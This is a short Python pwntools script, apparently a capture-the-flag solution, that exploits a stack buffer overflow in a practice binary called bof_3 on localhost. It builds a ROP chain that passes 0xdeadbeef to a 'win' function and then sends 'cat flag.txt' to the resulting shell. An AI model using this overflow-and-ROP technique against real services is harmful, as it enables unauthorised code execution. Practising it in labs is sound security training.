#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bof_3")
rop = ROP("./bof_3")

#p = process("./bof_3")
p = remote("localhost", 1337)
# gdb = gdb.attach(p, """
#     disass vuln
#     b * vuln + 41
#     b * vuln + 59
# """)

#log.info(f"{rop.rdi}")

payload = (32 + 8) * b"A"
payload += p64(rop.rdi.address)
payload += p64(0xdeadbeef)
payload += p64(rop.ret.address)
payload += p64(exe.sym.win)

p.sendline(payload)
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.interactive()